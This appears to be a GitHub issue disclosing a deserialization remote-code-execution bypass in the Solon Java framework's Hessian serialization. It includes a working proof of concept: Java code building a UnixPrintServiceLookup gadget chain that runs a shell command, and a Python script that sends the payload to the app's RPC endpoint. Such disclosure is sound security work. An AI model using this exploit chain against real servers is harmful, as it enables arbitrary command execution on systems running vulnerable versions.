### **[gfast777-sec](/gfast777-sec)** commented [May 22, 2023](#issue-1719808413)

| Problem I noticed that [issues73](https://github.com/noear/solon/issues/73) mentioned the solon got an RCE problem because of the `solon.serialization.hessian`, and the developer used the `sofa-hessian` to fix it. However, the `sofa-hessian` also can be bypassed. ReproduceThe server side I built a project based on the official example <https://github.com/noear/solon-examples/tree/main/3.Solon-Web/demo3041-gateway>, and you can get it in this [repo](https://github.com/gfast777-sec/solon-example). I only made a little bit of modification in `UserServiceImpl.java` to make it has the ability to receive data from the HTTP body:  ``` /**  * @author noear 2021/4/22 created  */ @Component public class UserServiceImpl implements UserService {     @Inject     UserDao userDao;      @Override     public UserModel getUser(String name) {         UserModel user = userDao.getUser();          return user;     } }  ```  Besides, Jdk8u92 is used when running this app. PoC You can get the malicious serialization data by running the following codes:  ``` String cmd = "touch /tmp/evilfile"; Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe"); theUnsafe.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafe.get(null); Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);  setFieldValue(unixPrintServiceLookup, "cmdIndex", 0); setFieldValue(unixPrintServiceLookup, "osname", "xx"); setFieldValue(unixPrintServiceLookup, "lpcFirstCom", new String[]{cmd, cmd, cmd});  JSONObject jsonObject = new JSONObject(); jsonObject.put("xx", unixPrintServiceLookup);  ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2Output hessianOutput = new Hessian2Output(byteArrayOutputStream); hessianOutput.setSerializerFactory(new SerializerFactory()); hessianOutput.getSerializerFactory().setAllowNonSerializable(true); hessianOutput.writeObject(jsonObject); hessianOutput.flushBuffer();  byte[] data = byteArrayOutputStream.toByteArray();  byte[] poc = new byte[data.length + 1]; System.arraycopy(new byte[]{67}, 0, poc, 0, 1); System.arraycopy(data, 0, poc, 1, data.length);  FileOutputStream fileOutputStream=new FileOutputStream(new File("/tmp/ser")); fileOutputStream.write(poc);  ```  One thing should be noticed is that this payload only works on Unix-like OS as the other platforms do not have `UnixPrintServiceLookup`. After that, the official plugin `solon.serialization.fastjson` also needs to introduce. Then, you can use the Python script to send the malicious data to the app(For convenience, I copy the script from issues73):  ``` with open("/tmp/ser","rb") as f:     body= f.read()     print(len(body))     burp0_url = "http://192.168.31.252:8080/rpc/v1/user/getUser"     burp0_cookies = {"_jpanonym": "\"OWQ0ZTEzNzBlMWFlYTY2NzhhMDMxOWM5MmYzMjc0MzgjMTY2NTU2NDE1MzAwOCMzMTUzNjAwMCNPR1ZpTkRVd05qWXpZbU0xTkRCaU0yRXlabVpoTlRrek5HUXpabVk1TmpJPQ==\"", "Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a": "1665564182"}     burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "deflate", "Connection": "close", "Content-Type": "application/hessian", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1"}     requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=body)  ``` Results[image](https://private-user-images.githubusercontent.com/132176365/239930227-a3c9aad8-7301-4c67-bb2b-382e2252fcb0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY4ODczODEsIm5iZiI6MTczNjg4NzA4MSwicGF0aCI6Ii8xMzIxNzYzNjUvMjM5OTMwMjI3LWEzYzlhYWQ4LTczMDEtNGM2Ny1iYjJiLTM4MmUyMjUyZmNiMC5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE0JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNFQyMDM4MDFaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mMWUzM2ZlYTg0MmFiMTgxMzk0Mzc4MTNlZmNhNDgyM2IwZjkxYjIwNDI4MTM4MzY1NDc1NTg5ZGNlNjg5MTU2JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.Rly9NcajtIONuXZkdXCSLyygSjTMaTr8Syac-QgIa5E) |
